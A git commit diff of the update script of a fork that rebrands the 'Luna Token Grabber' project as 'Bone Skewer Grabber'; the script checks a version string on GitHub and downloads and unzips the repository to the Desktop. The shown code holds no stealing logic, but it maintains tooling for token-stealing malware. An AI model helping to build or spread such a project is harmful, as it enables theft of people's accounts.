720d9330ac7938e3abb37a2f5b627a44be897e5b
Entity378 <106468171+Entity378@users.noreply.github.com>
2023-01-27 11:53:22 +0100

    Update update.py

--- tools/update.py
+++ tools/update.py
@@ -4,11 +4,11 @@ from zipfile import ZipFile
 
 import requests
 
-VERSION = '1.2.6'
+VERSION = '1.0.2'
 
 def check_update():
-    code = requests.get('https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/tools/update.py').text
-    if "VERSION = '1.2.6'" in code:
+    code = requests.get('https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber/main/tools/update.py').text
+    if "VERSION = '1.0.2'" in code:
         print('This version is up to date!')
         print('Exiting...')
         sleep(2)
@@ -21,15 +21,15 @@ def check_update():
                 ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                 ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                 ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
-                                  Your version of Luna Token Grabber is outdated!''')
+                                  Your version of Bone Skewer Grabber is outdated!''')
         choice = input('\nWould you like to update? (y/n): ')
         if choice.lower() == 'y':
-            new_version_source = requests.get('https://github.com/Smug246/Luna-Token-Grabber/archive/refs/heads/main.zip')
-            with open("Luna-Token-Grabber-main.zip", 'wb')as zipfile:
+            new_version_source = requests.get('https://github.com/Entity378/Bone-Skewer-Grabber/archive/refs/heads/main.zip')
+            with open("Bone-Skewer-Grabber-main.zip", 'wb')as zipfile:
                 zipfile.write(new_version_source.content)
-            with ZipFile("Luna-Token-Grabber-main.zip", 'r') as filezip:
+            with ZipFile("Bone-Skewer-Grabber-main.zip", 'r') as filezip:
                 filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Desktop"))
-            os.remove("Luna-Token-Grabber-main.zip")
+            os.remove("Bone-Skewer-Grabber-main.zip")
             print('The new version is now on your desktop.\nUpdate Complete!')
             print("Exiting...")
             sleep(5)
